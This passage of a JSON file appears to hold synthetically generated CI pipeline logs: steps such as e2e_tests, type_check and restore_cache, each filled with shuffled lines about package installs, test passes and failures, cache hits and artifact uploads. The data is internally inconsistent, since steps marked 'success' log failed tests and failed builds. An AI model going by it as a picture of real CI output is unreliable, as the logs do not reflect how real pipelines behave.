          "\u2713 test completed",
          "[12:00:34] INFO: Processing request",
          "  PASS: test_user_create (191ms)",
          "Step 5/10: Building",
          "Artifact uploaded: build.tar.gz (13MB)",
          "\u2713 lint completed",
          "  PASS: test_auth_login (52ms)",
          "[12:00:34] INFO: Processing request",
          "Compiling src/utils.go...",
          "=== Step save_cache completed ==="
        ]
      },
      {
        "name": "e2e_tests",
        "status": "success",
        "started_at": "2025-12-03T12:01:09.317794",
        "finished_at": "2025-12-03T12:01:22.635137",
        "log_lines": [
          "=== Step: e2e_tests ===",
          "Compiling src/index.js...",
          "  PASS: test_api_health (281ms)",
          "Cache hit for key-4400",
          "Compiling src/app.ts...",
          "Artifact uploaded: build.tar.gz (23MB)",
          "Installing eslint@5.2.0",
          "Compiling src/app.ts...",
          "Artifact uploaded: build.tar.gz (32MB)",
          "\u2713 test completed",
          "Cache hit for key-1244",
          "Step 2/10: Building",
          "\u2713 lint completed",
          "[12:00:34] INFO: Processing request",
          "  PASS: test_db_connect (127ms)",
          "\u2713 lint completed",
          "Step 10/10: Building",
          "[12:00:34] ERROR: Connection failed",
          "Artifact uploaded: build.tar.gz (4MB)",
          "Installing lodash@1.5.0",
          "\u2713 test completed",
          "Installing axios@5.9.0",
          "  PASS: test_auth_login (474ms)",
          "[12:00:34] WARN: Deprecated API usage",
          "Installing prettier@5.11.0",
          "Installing prettier@3.7.0",
          "Installing react@4.8.0",
          "Cache hit for key-6946",
          "\u2713 test completed",
          "\u2713 lint completed",
          "Installing express@3.17.0",
          "Installing express@3.9.0",
          "Compiling src/main.py...",
          "WARNING: eslint has known vulnerabilities",
          "Compiling src/utils.go...",
          "WARNING: express has known vulnerabilities",
          "Cache hit for key-4556",
          "Installing prettier@1.13.0",
          "[12:00:34] ERROR: Connection failed",
          "Artifact uploaded: build.tar.gz (23MB)",
          "Artifact uploaded: build.tar.gz (11MB)",
          "Artifact uploaded: build.tar.gz (45MB)",
          "Step 6/10: Building",
          "  PASS: test_auth_login (24ms)",
          "Compiling src/handler.rs...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Step 3/10: Building",
          "Step 4/10: Building",
          "  PASS: test_cache_hit (299ms)",
          "Cache hit for key-5417",
          "[12:00:34] INFO: Processing request",
          "Compiling src/main.py...",
          "WARNING: prettier has known vulnerabilities",
          "  PASS: test_user_create (382ms)",
          "Installing eslint@5.3.0",
          "Artifact uploaded: build.tar.gz (45MB)",
          "\u2713 lint completed",
          "Installing react@2.0.0",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (13MB)",
          "\u2713 build completed",
          "[12:00:34] WARN: Deprecated API usage",
          "\u2713 lint completed",
          "Installing webpack@1.18.0",
          "[12:00:34] INFO: Processing request",
          "Installing jest@2.8.0",
          "Step 5/10: Building",
          "  PASS: test_user_create (117ms)",
          "Compiling src/index.js...",
          "  PASS: test_api_health (122ms)",
          "[12:00:34] INFO: Processing request",
          "[12:00:34] INFO: Processing request",
          "Cache hit for key-4600",
          "  PASS: test_auth_login (402ms)",
          "  PASS: test_db_connect (118ms)",
          "  PASS: test_api_health (85ms)",
          "Artifact uploaded: build.tar.gz (44MB)",
          "FAILED: test_user_create",
          "[12:00:34] INFO: Processing request",
          "Installing eslint@1.5.0",
          "Cache hit for key-7000",
          "[12:00:34] WARN: Deprecated API usage",
          "Step 3/10: Building",
          "\u2713 build completed",
          "  PASS: test_auth_login (472ms)",
          "Artifact uploaded: build.tar.gz (5MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "WARNING: lodash has known vulnerabilities",
          "Step 10/10: Building",
          "Artifact uploaded: build.tar.gz (29MB)",
          "[12:00:34] WARN: Deprecated API usage",
          "Step 3/10: Building",
          "Artifact uploaded: build.tar.gz (50MB)",
          "Cache hit for key-5078",
          "  PASS: test_api_health (23ms)",
          "Artifact uploaded: build.tar.gz (14MB)",
          "Step 9/10: Building",
          "Step 1/10: Building",
          "Compiling src/index.js...",
          "Step 6/10: Building",
          "Step 4/10: Building",
          "Cache hit for key-5097",
          "Step 10/10: Building",
          "Compiling src/service.java...",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (9MB)",
          "FAILED: test_api_health",
          "Artifact uploaded: build.tar.gz (32MB)",
          "Artifact uploaded: build.tar.gz (40MB)",
          "Installing prettier@5.18.0",
          "  PASS: test_api_health (123ms)",
          "  PASS: test_db_connect (134ms)",
          "Cache hit for key-7722",
          "Step 4/10: Building",
          "[12:00:34] INFO: Processing request",
          "[12:00:34] ERROR: Connection failed",
          "Installing eslint@3.0.0",
          "Cache hit for key-5147",
          "  PASS: test_auth_login (43ms)",
          "\u2713 lint completed",
          "Installing react@4.11.0",
          "  PASS: test_db_connect (224ms)",
          "Installing eslint@3.6.0",
          "Cache hit for key-1568",
          "Installing lodash@1.11.0",
          "Installing lodash@4.4.0",
          "Installing express@1.10.0",
          "Artifact uploaded: build.tar.gz (40MB)",
          "Artifact uploaded: build.tar.gz (46MB)",
          "[12:00:34] INFO: Processing request",
          "Cache hit for key-3179",
          "Compiling src/service.java...",
          "  PASS: test_cache_hit (27ms)",
          "Cache hit for key-1656",
          "[12:00:34] WARN: Deprecated API usage",
          "  PASS: test_user_create (296ms)",
          "  PASS: test_api_health (222ms)",
          "Step 7/10: Building",
          "Compiling src/index.js...",
          "  PASS: test_auth_login (367ms)",
          "  PASS: test_cache_hit (92ms)",
          "Compiling src/index.js...",
          "[12:00:34] INFO: Processing request",
          "Installing eslint@3.6.0",
          "Step 8/10: Building",
          "Cache hit for key-4347",
          "Cache hit for key-2636",
          "Compiling src/app.ts...",
          "  PASS: test_auth_login (428ms)",
          "Step 5/10: Building",
          "Installing webpack@2.18.0",
          "Installing express@2.7.0",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:00:34] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (37MB)",
          "  PASS: test_user_create (440ms)",
          "Cache hit for key-3291",
          "Cache hit for key-3852",
          "Installing express@4.3.0",
          "\u2713 lint completed",
          "Installing webpack@4.8.0",
          "Cache hit for key-2554",
          "Cache hit for key-9386",
          "FAILED: test_auth_login",
          "Compiling src/service.java...",
          "\u2713 build completed",
          "Installing lodash@4.5.0",
          "Step 4/10: Building",
          "Step 6/10: Building",
          "Step 3/10: Building",
          "Artifact uploaded: build.tar.gz (7MB)",
          "Installing react@3.3.0",
          "Step 3/10: Building",
          "\u2713 build completed",
          "[12:00:34] INFO: Processing request",
          "Step 1/10: Building",
          "Installing express@4.11.0",
          "  PASS: test_user_create (132ms)",
          "  PASS: test_cache_hit (33ms)",
          "  PASS: test_db_connect (219ms)",
          "Compiling src/utils.go...",
          "Installing axios@2.9.0",
          "\u2713 lint completed",
          "Exception: TypeError",
          "  PASS: test_auth_login (237ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Compiling src/main.py...",
          "Compiling src/main.py...",
          "  PASS: test_auth_login (358ms)",
          "[12:00:34] INFO: Processing request",
          "Cache hit for key-1038",
          "[12:00:34] INFO: Processing request",
          "Step 1/10: Building",
          "  PASS: test_api_health (83ms)",
          "\u2713 build completed",
          "[12:00:34] ERROR: Connection failed",
          "[12:00:34] ERROR: Connection failed",
          "Step 9/10: Building",
          "  PASS: test_api_health (474ms)",
          "Step 5/10: Building",
          "[12:00:34] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (49MB)",
          "Compiling src/main.py...",
          "[12:00:34] INFO: Processing request",
          "Cache hit for key-6115",
          "\u2713 lint completed",
          "Step 10/10: Building",
          "  PASS: test_user_create (483ms)",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (26MB)",
          "Artifact uploaded: build.tar.gz (18MB)",
          "Compiling src/utils.go...",
          "Compiling src/index.js...",
          "[12:00:34] INFO: Processing request",
          "Installing prettier@3.15.0",
          "Artifact uploaded: build.tar.gz (16MB)",
          "\u2713 lint completed",
          "WARNING: axios has known vulnerabilities",
          "[12:00:34] WARN: Deprecated API usage",
          "Step 9/10: Building",
          "[12:00:34] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (17MB)",
          "[12:00:34] WARN: Deprecated API usage",
          "[12:00:34] INFO: Processing request",
          "\u2713 test completed",
          "=== Step e2e_tests completed ==="
        ]
      },
      {
        "name": "type_check",
        "status": "success",
        "started_at": "2025-12-03T12:01:22.635137",
        "finished_at": "2025-12-03T12:01:35.952480",
        "log_lines": [
          "=== Step: type_check ===",
          "WARNING: prettier has known vulnerabilities",
          "Step 7/10: Building",
          "\u2713 test completed",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (13MB)",
          "[12:00:34] INFO: Processing request",
          "\u2713 lint completed",
          "  PASS: test_user_create (419ms)",
          "Installing react@3.3.0",
          "Step 7/10: Building",
          "Exception: NullPointerException",
          "Installing axios@4.10.0",
          "Artifact uploaded: build.tar.gz (42MB)",
          "Artifact uploaded: build.tar.gz (13MB)",
          "  PASS: test_auth_login (116ms)",
          "Cache hit for key-7274",
          "\u2713 test completed",
          "  PASS: test_api_health (19ms)",
          "Compiling src/handler.rs...",
          "Cache hit for key-5062",
          "Compiling src/handler.rs...",
          "Cache hit for key-9728",
          "Exception: NullPointerException",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (40MB)",
          "  PASS: test_cache_hit (351ms)",
          "[12:00:34] INFO: Processing request",
          "Installing express@5.12.0",
          "Artifact uploaded: build.tar.gz (12MB)",
          "Installing express@3.19.0",
          "Compiling src/app.ts...",
          "\u2713 lint completed",
          "[12:00:34] WARN: Deprecated API usage",
          "\u2713 lint completed",
          "\u2713 test completed",
          "Installing prettier@1.14.0",
          "Compiling src/index.js...",
          "Compiling src/handler.rs...",
          "Cache hit for key-2188",
          "WARNING: axios has known vulnerabilities",
          "Step 2/10: Building",
          "Artifact uploaded: build.tar.gz (18MB)",
          "Artifact uploaded: build.tar.gz (5MB)",
          "Artifact uploaded: build.tar.gz (37MB)",
          "\u2713 test completed",
          "Installing axios@4.18.0",
          "\u2713 test completed",
          "Cache hit for key-1156",
          "Artifact uploaded: build.tar.gz (30MB)",
          "Compiling src/handler.rs...",
          "[12:00:34] INFO: Processing request",
          "Step 2/10: Building",
          "Artifact uploaded: build.tar.gz (16MB)",
          "Step 2/10: Building",
          "Compiling src/handler.rs...",
          "Installing express@1.5.0",
          "Artifact uploaded: build.tar.gz (7MB)",
          "Installing express@3.6.0",
          "  PASS: test_api_health (258ms)",
          "Cache hit for key-9825",
          "[12:00:34] WARN: Deprecated API usage",
          "  PASS: test_api_health (132ms)",
          "Step 1/10: Building",
          "Compiling src/app.ts...",
          "Step 2/10: Building",
          "Cache hit for key-7159",
          "Step 9/10: Building",
          "[12:00:34] INFO: Processing request",
          "\u2713 build completed",
          "Step 10/10: Building",
          "Step 2/10: Building",
          "[12:00:34] INFO: Processing request",
          "Cache hit for key-6994",
          "[12:00:34] INFO: Processing request",
          "Step 10/10: Building",
          "  PASS: test_api_health (437ms)",
          "Step 10/10: Building",
          "Installing axios@3.12.0",
          "  PASS: test_auth_login (323ms)",
          "Artifact uploaded: build.tar.gz (3MB)",
          "Step 3/10: Building",
          "  PASS: test_auth_login (477ms)",
          "  PASS: test_user_create (431ms)",
          "Compiling src/utils.go...",
          "[12:00:34] WARN: Deprecated API usage",
          "[12:00:34] INFO: Processing request",
          "Cache hit for key-2726",
          "\u2713 test completed",
          "[12:00:34] WARN: Deprecated API usage",
          "Installing lodash@2.5.0",
          "[12:00:34] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (10MB)",
          "Artifact uploaded: build.tar.gz (20MB)",
          "Installing axios@1.18.0",
          "\u2713 test completed",
          "Installing prettier@4.13.0",
          "WARNING: lodash has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (34MB)",
          "  PASS: test_user_create (78ms)",
          "Artifact uploaded: build.tar.gz (15MB)",
          "\u2713 lint completed",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Artifact uploaded: build.tar.gz (35MB)",
          "Installing webpack@2.18.0",
          "Step 3/10: Building",
          "Cache hit for key-9306",
          "[12:00:34] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (47MB)",
          "[12:00:34] WARN: Deprecated API usage",
          "Cache hit for key-7405",
          "Artifact uploaded: build.tar.gz (3MB)",
          "[12:00:34] INFO: Processing request",
          "[12:00:34] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (2MB)",
          "  PASS: test_auth_login (372ms)",
          "Installing lodash@5.9.0",
          "Compiling src/service.java...",
          "Installing jest@2.11.0",
          "Artifact uploaded: build.tar.gz (33MB)",
          "Installing lodash@4.0.0",
          "Step 8/10: Building",
          "Installing lodash@4.5.0",
          "Cache hit for key-2077",
          "Cache hit for key-3669",
          "  PASS: test_cache_hit (51ms)",
          "[12:00:34] INFO: Processing request",
          "Cache hit for key-5632",
          "Artifact uploaded: build.tar.gz (30MB)",
          "[12:00:34] INFO: Processing request",
          "Compiling src/main.py...",
          "Cache hit for key-7990",
          "Compiling src/app.ts...",
          "Step 9/10: Building",
          "Installing react@5.5.0",
          "Cache hit for key-9551",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Artifact uploaded: build.tar.gz (49MB)",
          "Artifact uploaded: build.tar.gz (10MB)",
          "\u2713 build completed",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (10MB)",
          "Artifact uploaded: build.tar.gz (4MB)",
          "\u2713 lint completed",
          "Cache hit for key-1239",
          "[12:00:34] INFO: Processing request",
          "Step 9/10: Building",
          "  PASS: test_cache_hit (451ms)",
          "Cache hit for key-1200",
          "[12:00:34] INFO: Processing request",
          "  PASS: test_cache_hit (50ms)",
          "[12:00:34] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (48MB)",
          "\u2713 lint completed",
          "Cache hit for key-8325",
          "Installing webpack@4.3.0",
          "Compiling src/app.ts...",
          "[12:00:34] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (25MB)",
          "\u2713 lint completed",
          "[12:00:34] INFO: Processing request",
          "Cache hit for key-5010",
          "\u2713 build completed",
          "Installing react@3.0.0",
          "FAILED: test_api_health",
          "Installing axios@1.0.0",
          "[12:00:34] INFO: Processing request",
          "Installing jest@1.15.0",
          "Artifact uploaded: build.tar.gz (16MB)",
          "Installing webpack@1.13.0",
          "Installing react@4.15.0",
          "WARNING: react has known vulnerabilities",
          "WARNING: lodash has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (3MB)",
          "Step 4/10: Building",
          "Installing eslint@5.8.0",
          "  PASS: test_api_health (426ms)",
          "  PASS: test_api_health (17ms)",
          "Installing lodash@2.9.0",
          "[12:00:34] INFO: Processing request",
          "Compiling src/handler.rs...",
          "  PASS: test_user_create (142ms)",
          "Step 7/10: Building",
          "Installing eslint@5.5.0",
          "Compiling src/utils.go...",
          "[12:00:34] INFO: Processing request",
          "Step 7/10: Building",
          "[12:00:34] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (29MB)",
          "Artifact uploaded: build.tar.gz (20MB)",
          "Installing lodash@4.17.0",
          "Compiling src/handler.rs...",
          "Compiling src/main.py...",
          "Cache hit for key-9433",
          "\u2713 lint completed",
          "Compiling src/app.ts...",
          "Step 6/10: Building",
          "Compiling src/service.java...",
          "FAILED: test_auth_login",
          "  PASS: test_user_create (163ms)",
          "[12:00:34] INFO: Processing request",
          "Compiling src/service.java...",
          "Step 2/10: Building",
          "[12:00:34] INFO: Processing request",
          "[12:00:34] INFO: Processing request",
          "Installing axios@2.18.0",
          "\u2713 lint completed",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Artifact uploaded: build.tar.gz (27MB)",
          "WARNING: lodash has known vulnerabilities",
          "Step 4/10: Building",
          "Compiling src/app.ts...",
          "[12:00:34] WARN: Deprecated API usage",
          "Compiling src/utils.go...",
          "Step 10/10: Building",
          "Cache hit for key-5359",
          "[12:00:34] INFO: Processing request",
          "Installing prettier@2.20.0",
          "\u2713 build completed",
          "\u2713 test completed",
          "Cache hit for key-9588",
          "Compiling src/utils.go...",
          "Installing react@2.10.0",
          "WARNING: react has known vulnerabilities",
          "[12:00:34] INFO: Processing request",
          "=== Step type_check completed ==="
        ]
      },
      {
        "name": "restore_cache",
        "status": "success",
        "started_at": "2025-12-03T12:01:35.952480",
        "finished_at": "2025-12-03T12:01:43.942886",
        "log_lines": [
          "=== Step: restore_cache ===",
          "\u2713 build completed",
          "Compiling src/main.py...",
          "Cache hit for key-7993",
          "  PASS: test_auth_login (233ms)",
          "Step 3/10: Building",
          "Cache hit for key-6492",
          "Step 2/10: Building",
          "[12:00:34] INFO: Processing request",
          "[12:00:34] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (35MB)",
          "WARNING: webpack has known vulnerabilities",
          "Compiling src/handler.rs...",
          "WARNING: express has known vulnerabilities",
          "\u2713 lint completed",
          "\u2713 lint completed",
          "Compiling src/service.java...",
          "Cache hit for key-4517",
          "  PASS: test_auth_login (183ms)",
          "\u2713 build completed",
          "Installing react@3.12.0",
          "\u2713 lint completed",
          "Cache hit for key-4014",
          "Cache hit for key-8351",
          "Cache hit for key-2677",
          "\u2713 build completed",
          "Step 4/10: Building",
          "[12:00:34] INFO: Processing request",
          "WARNING: react has known vulnerabilities",
          "FAILED: test_user_create",
          "Step 8/10: Building",
          "Compiling src/index.js...",
          "Artifact uploaded: build.tar.gz (26MB)",
          "\u2713 build completed",
          "Compiling src/index.js...",
          "  PASS: test_db_connect (208ms)",
          "[12:00:34] INFO: Processing request",
          "Compiling src/main.py...",
          "[12:00:34] INFO: Processing request",
          "WARNING: react has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (42MB)",
          "[12:00:34] INFO: Processing request",
          "Step 3/10: Building",
          "[12:00:34] INFO: Processing request",
          "  PASS: test_cache_hit (285ms)",
          "Compiling src/utils.go...",
          "Cache hit for key-3902",
          "Compiling src/utils.go...",
          "Step 1/10: Building",
          "Artifact uploaded: build.tar.gz (18MB)",
          "Compiling src/handler.rs...",
          "Compiling src/app.ts...",
          "\u2713 build completed",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "\u2713 build completed",
          "FAILED: test_cache_hit",
          "Step 9/10: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:00:34] WARN: Deprecated API usage",
          "Compiling src/service.java...",
          "Compiling src/main.py...",
          "[12:00:34] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (12MB)",
          "Cache hit for key-1975",
          "Step 2/10: Building",
          "\u2713 build completed",
          "\u2713 lint completed",
          "Installing lodash@2.12.0",
          "Compiling src/app.ts...",
          "Compiling src/app.ts...",
          "\u2713 build completed",
          "[12:00:34] WARN: Deprecated API usage",
          "Compiling src/main.py...",
          "Compiling src/handler.rs...",
          "[12:00:34] INFO: Processing request",
          "Compiling src/service.java...",
          "Installing prettier@2.14.0",
          "\u2713 lint completed",
          "  PASS: test_cache_hit (351ms)",
          "\u2717 build failed with exit code 53",
          "\u2713 build completed",
          "Cache hit for key-7290",
          "WARNING: jest has known vulnerabilities",
          "Compiling src/index.js...",
          "Installing lodash@1.9.0",
          "\u2713 lint completed",
          "Step 5/10: Building",
          "[12:00:34] INFO: Processing request",
          "Compiling src/app.ts...",
          "Step 5/10: Building",
          "\u2713 lint completed",
          "FAILED: test_db_connect",
          "Cache hit for key-9535",
          "Step 5/10: Building",
          "Step 8/10: Building",
          "Compiling src/index.js...",
          "Installing react@4.10.0",
          "Compiling src/main.py...",
          "Compiling src/main.py...",
          "Step 8/10: Building",
          "Step 10/10: Building",
          "Compiling src/index.js...",
          "Compiling src/service.java...",
          "  PASS: test_db_connect (11ms)",
          "  PASS: test_auth_login (412ms)",
          "Compiling src/main.py...",
          "Step 7/10: Building",
          "Compiling src/main.py...",
          "  PASS: test_auth_login (207ms)",
          "Compiling src/index.js...",
          "Step 7/10: Building",
          "\u2713 build completed",
          "Installing axios@5.10.0",
          "\u2717 build failed with exit code 82",
          "Artifact uploaded: build.tar.gz (10MB)",
          "  PASS: test_cache_hit (472ms)",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (24MB)",
          "\u2713 build completed",
          "Compiling src/handler.rs...",
          "Artifact uploaded: build.tar.gz (35MB)",
          "Compiling src/app.ts...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Step 5/10: Building",
          "\u2713 lint completed",
          "Installing express@3.16.0",
          "Cache hit for key-8655",
          "Installing jest@4.2.0",
          "Installing lodash@5.18.0",
          "[12:00:34] INFO: Processing request",
          "\u2713 build completed",
          "Compiling src/app.ts...",
          "  PASS: test_user_create (263ms)",
          "WARNING: prettier has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (3MB)",
          "Compiling src/main.py...",
          "Installing eslint@5.0.0",
          "Artifact uploaded: build.tar.gz (32MB)",
          "Step 6/10: Building",
          "Installing webpack@5.7.0",
          "Step 2/10: Building",
          "[12:00:34] INFO: Processing request",
          "Step 1/10: Building",
          "[12:00:34] INFO: Processing request",
          "\u2713 lint completed",
          "  PASS: test_cache_hit (48ms)",
          "Compiling src/index.js...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Cache hit for key-5695",
          "\u2713 lint completed",
          "Installing axios@1.5.0",
          "Artifact uploaded: build.tar.gz (6MB)",
          "[12:00:34] INFO: Processing request",
          "Installing express@5.9.0",
          "Step 2/10: Building",
          "Installing lodash@4.10.0",
          "  PASS: test_db_connect (37ms)",
          "Installing react@3.2.0",
          "[12:00:34] ERROR: Connection failed",
          "[12:00:34] INFO: Processing request",
          "WARNING: webpack has known vulnerabilities",
          "Step 3/10: Building",
          "Installing lodash@3.11.0",
          "Cache hit for key-1403",
          "[12:00:34] INFO: Processing request",
          "Step 5/10: Building",
          "Compiling src/service.java...",
          "Compiling src/handler.rs...",
          "Step 1/10: Building",
          "  PASS: test_cache_hit (390ms)",
          "\u2713 test completed",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Cache hit for key-1383",
          "\u2713 lint completed",
          "[12:00:34] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (25MB)",
          "Cache hit for key-1112",
          "[12:00:34] INFO: Processing request",
          "  PASS: test_api_health (360ms)",
          "Cache hit for key-2523",
          "Compiling src/utils.go...",
          "[12:00:34] INFO: Processing request",
          "Cache hit for key-3312",
          "Step 6/10: Building",
          "Cache hit for key-4693",
          "Artifact uploaded: build.tar.gz (3MB)",
          "Compiling src/utils.go...",
          "Cache hit for key-3429",
          "Installing axios@3.1.0",
          "\u2713 lint completed",
          "Installing express@3.1.0",
          "  PASS: test_auth_login (306ms)",
          "\u2713 lint completed",
          "[12:00:34] INFO: Processing request",
          "Compiling src/service.java...",
          "Step 2/10: Building",
          "[12:00:34] WARN: Deprecated API usage",
          "[12:00:34] INFO: Processing request",
          "Cache hit for key-6504",
          "Artifact uploaded: build.tar.gz (18MB)",
          "Step 7/10: Building",
          "Installing eslint@2.19.0",
          "  PASS: test_db_connect (98ms)",
          "Artifact uploaded: build.tar.gz (27MB)",
          "Artifact uploaded: build.tar.gz (16MB)",
          "  PASS: test_user_create (23ms)",
          "  PASS: test_api_health (105ms)",
          "Artifact uploaded: build.tar.gz (31MB)",
          "WARNING: jest has known vulnerabilities",
          "\u2717 build failed with exit code 16",
          "Cache hit for key-7666",
          "Compiling src/app.ts...",
          "Step 10/10: Building",
          "Cache hit for key-7001",
          "[12:00:34] WARN: Deprecated API usage",
          "Cache hit for key-4224",
          "  PASS: test_cache_hit (450ms)",
          "Cache hit for key-9504",
          "[12:00:34] INFO: Processing request",
          "WARNING: eslint has known vulnerabilities",
          "Step 7/10: Building",
          "Installing jest@4.10.0",
          "Artifact uploaded: build.tar.gz (7MB)",
          "Cache hit for key-3066",
          "\u2713 lint completed",
          "=== Step restore_cache completed ==="
        ]
      },
      {
        "name": "setup_environment",
        "status": "success",
        "started_at": "2025-12-03T12:01:43.942886",
        "finished_at": "2025-12-03T12:01:57.260229",
        "log_lines": [
          "=== Step: setup_environment ===",
          "[12:00:34] INFO: Processing request",
          "Compiling src/service.java...",
          "Cache hit for key-7039",
          "[12:00:34] INFO: Processing request",
          "\u2717 build failed with exit code 109",
          "Step 1/10: Building",
          "Installing jest@5.4.0",
          "Installing express@1.11.0",
          "Artifact uploaded: build.tar.gz (34MB)",
          "Compiling src/utils.go...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Artifact uploaded: build.tar.gz (27MB)",
          "Artifact uploaded: build.tar.gz (9MB)",
          "[12:00:34] INFO: Processing request",
          "[12:00:34] WARN: Deprecated API usage",
          "\u2717 build failed with exit code 49",
          "[12:00:34] INFO: Processing request",
          "Cache hit for key-1114",
          "[12:00:34] WARN: Deprecated API usage",
          "\u2713 lint completed",
          "Installing express@1.13.0",
          "\u2713 lint completed",
          "Cache hit for key-7481",
          "  PASS: test_auth_login (442ms)",
          "  PASS: test_cache_hit (429ms)",
          "  PASS: test_user_create (49ms)",
          "Installing webpack@1.0.0",
          "[12:00:34] INFO: Processing request",
          "[12:00:34] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Installing axios@5.11.0",
          "Step 5/10: Building",
          "Step 5/10: Building",
          "Installing prettier@1.19.0",
          "[12:00:34] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Artifact uploaded: build.tar.gz (24MB)",
          "Step 1/10: Building",
          "  PASS: test_cache_hit (218ms)",
          "Cache hit for key-6804",
          "Step 9/10: Building",
          "Installing prettier@4.0.0",
          "  PASS: test_cache_hit (328ms)",
          "Compiling src/utils.go...",
          "Step 1/10: Building",
          "  PASS: test_cache_hit (334ms)",
          "Compiling src/utils.go...",
          "\u2713 build completed",
          "Exception: ValueError",
          "WARNING: axios has known vulnerabilities",
          "Installing express@2.6.0",
          "Step 6/10: Building",
          "\u2713 test completed",
          "  PASS: test_api_health (380ms)",
          "WARNING: jest has known vulnerabilities",
          "Step 1/10: Building",
          "  PASS: test_cache_hit (490ms)",
          "[12:00:34] INFO: Processing request",
          "Step 1/10: Building",
          "Step 1/10: Building",
          "Exception: ValueError",
          "Artifact uploaded: build.tar.gz (32MB)",
          "\u2713 test completed",
          "Compiling src/app.ts...",
          "Artifact uploaded: build.tar.gz (39MB)",
          "Artifact uploaded: build.tar.gz (8MB)",
          "[12:00:34] WARN: Deprecated API usage",
          "\u2713 test completed",
          "[12:00:34] WARN: Deprecated API usage",
          "  PASS: test_user_create (50ms)",
          "[12:00:34] INFO: Processing request",
          "Step 9/10: Building",
          "Step 6/10: Building",
          "Installing express@1.16.0",
          "WARNING: react has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (45MB)",
          "Step 2/10: Building",
          "Compiling src/handler.rs...",
          "  PASS: test_api_health (67ms)",
          "Artifact uploaded: build.tar.gz (28MB)",
          "Cache hit for key-4544",
          "Cache hit for key-9440",
          "[12:00:34] INFO: Processing request",
          "Compiling src/service.java...",
          "  PASS: test_api_health (403ms)",
          "  PASS: test_cache_hit (333ms)",
          "Exception: RuntimeError",
          "Installing axios@5.15.0",
          "Cache hit for key-7155",
          "Step 10/10: Building",
          "Cache hit for key-3396",
          "Installing react@1.11.0",
          "[12:00:34] INFO: Processing request",
          "[12:00:34] INFO: Processing request",
          "Compiling src/app.ts...",
          "  PASS: test_auth_login (121ms)",
          "Artifact uploaded: build.tar.gz (16MB)",
          "Artifact uploaded: build.tar.gz (13MB)",
          "\u2713 build completed",
          "  PASS: test_db_connect (35ms)",
          "Artifact uploaded: build.tar.gz (2MB)",
          "WARNING: jest has known vulnerabilities",
          "Compiling src/index.js...",
          "  PASS: test_db_connect (320ms)",
          "Step 6/10: Building",
          "Installing prettier@5.13.0",
          "[12:00:34] INFO: Processing request",
          "Installing react@4.0.0",
          "Cache hit for key-1779",
          "[12:00:34] INFO: Processing request",
          "Step 5/10: Building",
          "Step 1/10: Building",
          "Compiling src/handler.rs...",
          "[12:00:34] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (45MB)",
          "[12:00:34] INFO: Processing request",
          "Compiling src/main.py...",
          "Step 1/10: Building",
          "Installing axios@2.0.0",
          "[12:00:34] WARN: Deprecated API usage",
          "\u2717 build failed with exit code 10",
          "[12:00:34] INFO: Processing request",
          "Compiling src/service.java...",
          "Step 2/10: Building",
          "\u2713 test completed",
          "  PASS: test_api_health (185ms)",
          "Step 2/10: Building",
          "  PASS: test_db_connect (218ms)",
          "Step 5/10: Building",
          "Cache hit for key-1717",
          "\u2717 build failed with exit code 76",
          "Installing react@5.18.0",
          "Installing react@4.6.0",
          "Cache hit for key-4283",
          "\u2713 test completed",
          "  PASS: test_user_create (41ms)",
          "Exception: ValueError",
          "Step 7/10: Building",
          "Cache hit for key-1531",
          "\u2713 build completed",
          "Cache hit for key-8897",
          "\u2713 test completed",
          "\u2713 build completed",
          "Installing express@1.15.0",
          "Step 6/10: Building",
          "  PASS: test_user_create (19ms)",
          "\u2713 lint completed",
          "Step 9/10: Building",
          "Cache hit for key-9663",
          "Step 2/10: Building",
          "[12:00:34] INFO: Processing request",
          "\u2713 test completed",
          "[12:00:34] INFO: Processing request",
          "\u2713 test completed",
          "Cache hit for key-8352",
          "Step 9/10: Building",
          "  PASS: test_db_connect (309ms)",
          "Cache hit for key-2882",
          "[12:00:34] INFO: Processing request",
          "Step 3/10: Building",
          "Compiling src/utils.go...",
          "Installing webpack@5.2.0",
          "Installing jest@4.20.0",
          "  PASS: test_db_connect (297ms)",
          "Step 9/10: Building",
          "WARNING: eslint has known vulnerabilities",
          "[12:00:34] INFO: Processing request",
          "Installing express@2.0.0",
          "Artifact uploaded: build.tar.gz (36MB)",
          "Cache hit for key-5347",
